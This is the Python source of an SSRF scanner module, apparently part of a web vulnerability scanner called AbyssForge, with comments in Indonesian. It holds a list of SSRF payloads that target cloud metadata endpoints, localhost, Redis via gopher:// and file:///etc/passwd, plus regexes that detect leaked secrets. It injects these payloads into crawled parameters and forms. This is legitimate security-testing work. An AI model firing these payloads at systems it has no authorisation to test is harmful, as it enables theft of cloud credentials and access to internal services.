"""
AbyssForge - SSRF (Server-Side Request Forgery) Scanner
Deteksi SSRF pada parameter URL, form, dan header.
Hanya boleh import dari core dan utils.
"""

import asyncio
import logging
import re
from typing import List
from urllib.parse import urlparse

from core.config import ScanConfig
from core.finding import Finding
from core.http_client import AsyncHTTPClient
from core.crawler import CrawledURL
from utils.url_utils import inject_param

logger = logging.getLogger(__name__)
MODULE_NAME = "ssrf"

# Parameter yang sering rentan SSRF
SSRF_PARAM_KEYWORDS = [
    "url", "uri", "href", "src", "source", "dest", "destination",
    "redirect", "redirect_to", "return", "return_url", "next",
    "callback", "link", "host", "target", "fetch", "load",
    "path", "page", "file", "document", "proxy", "image_url",
    "img_url", "feed", "rss", "webhook", "endpoint", "api_url",
]

# Internal targets untuk SSRF probe (cloud metadata, localhost services)
SSRF_PROBES = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",     # AWS
    "http://169.254.169.254/computeMetadata/v1/",   # GCP
    "http://169.254.169.254/metadata/instance",     # Azure
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://2130706433/",        # 127.0.0.1 sebagai integer
    "http://0x7f000001/",        # 127.0.0.1 hex
    "dict://127.0.0.1:6379/",   # Redis
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_PING",
]

# Indikator bahwa SSRF berhasil
SSRF_SUCCESS_INDICATORS = [
    r"root:.*:0:0:",                   # /etc/passwd
    r"ami-id",                         # AWS metadata
    r"instance-id",                    # Cloud metadata
    r"computeMetadata",               # GCP
    r'"compute"',                     # GCP
    r"serviceAccountEmail",           # GCP
    r'MSI_ENDPOINT',                  # Azure
    r"\+PONG",                        # Redis
    r"220.*FTP",                      # FTP server
    r"SSH-2\.0",                      # SSH
]
_SSRF_SUCCESS_RE = re.compile("|".join(SSRF_SUCCESS_INDICATORS), re.IGNORECASE)

# Respons yang mengindikasikan koneksi internal (meski konten tidak bocor)
SSRF_INTERNAL_INDICATORS = [
    "connection refused",
    "connection reset",
    "could not connect",
    "no route to host",
    "ECONNREFUSED",
]


def _is_ssrf_param(param: str) -> bool:
    """Periksa apakah nama parameter sering rentan SSRF."""
    p = param.lower()
    return any(kw in p for kw in SSRF_PARAM_KEYWORDS)


async def _test_ssrf_param(
    http: AsyncHTTPClient,
    url: str,
    param: str,
    method: str = "GET",
) -> List[Finding]:
    """Uji satu parameter untuk SSRF."""
    findings = []

    for probe in SSRF_PROBES:
        try:
            if method.upper() == "GET":
                test_url = inject_param(url, param, probe)
                resp = await http.get(test_url)
            else:
                resp = await http.post(url, data={param: probe})

            if resp.error:
                continue

            # Periksa konten yang bocor
            if _SSRF_SUCCESS_RE.search(resp.text):
                m = _SSRF_SUCCESS_RE.search(resp.text)
                snippet = resp.text[max(0, m.start()-30):m.end()+200].strip()

                findings.append(Finding.from_cvss(
                    cvss_score=9.8,
                    title="Server-Side Request Forgery (SSRF) Terkonfirmasi",
                    vuln_type=MODULE_NAME,
                    url=test_url if method.upper() == "GET" else url,
                    parameter=param,
                    method=method,
                    description=(
                        f"Parameter '{param}' rentan terhadap SSRF. "
                        f"Server berhasil mengakses resource internal: {probe}. "
                        "Attacker dapat mengakses layanan internal, metadata cloud, "
                        "atau melakukan port scanning dari server target."
                    ),
                    evidence=snippet[:400],
                    payload=probe,
                    remediation=(
                        "Validasi dan whitelist semua URL yang diizinkan. "
                        "Tolak request ke private IP ranges (RFC 1918) dan localhost. "
                        "Gunakan DNS rebinding protection. "
                        "Implementasikan egress filtering di firewall."
                    ),
                    references="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                    module=MODULE_NAME,
                    confidence="HIGH",
                ))
                return findings  # Satu konfirmasi cukup

            # Heuristik: response mengindikasikan koneksi ke internal (tapi tanpa output)
            body_lower = resp.text.lower()
            if any(ind in body_lower for ind in SSRF_INTERNAL_INDICATORS):
                # Kemungkinan SSRF tapi tanpa output — laporkan sebagai LOW confidence
                findings.append(Finding.from_cvss(
                    cvss_score=7.2,
                    title="Potensi SSRF (Heuristik)",
                    vuln_type=MODULE_NAME,
                    url=test_url if method.upper() == "GET" else url,
                    parameter=param,
                    method=method,
                    description=(
                        f"Parameter '{param}' menampilkan perilaku yang mengindikasikan SSRF. "
                        "Response mengandung pesan error koneksi internal."
                    ),
                    evidence=resp.text[:300].strip(),
                    payload=probe,
                    remediation=(
                        "Validasi semua input URL. Whitelist domain yang diizinkan. "
                        "Gunakan DNS allowlist dan blokir akses ke private IP ranges."
                    ),
                    references="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                    module=MODULE_NAME,
                    confidence="LOW",
                    false_positive_risk="HIGH",
                ))
                break  # Satu heuristik cukup untuk parameter ini

        except Exception as exc:
            logger.debug("SSRF test error pada %s[%s]: %s", url, param, exc)

    return findings


async def scan(
    config: ScanConfig,
    http: AsyncHTTPClient,
    crawled: List[CrawledURL],
) -> List[Finding]:
    """Entry point modul SSRF."""
    findings: List[Finding] = []
    tasks = []

    for page in crawled:
        # Periksa query params yang namanya mengindikasikan SSRF
        for param in page.params:
            if _is_ssrf_param(param):
                tasks.append(_test_ssrf_param(http, page.url, param, "GET"))

        # Periksa form inputs
        for form in page.forms:
            for inp in form.get("inputs", []):
                if _is_ssrf_param(inp):
                    tasks.append(_test_ssrf_param(http, form["action"], inp, form["method"]))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            findings.extend(r)

    # Deduplikasi
    seen, unique = set(), []
    for f in findings:
        key = (f.url, f.parameter)
        if key not in seen:
            seen.add(key)
            unique.append(f)

    return unique
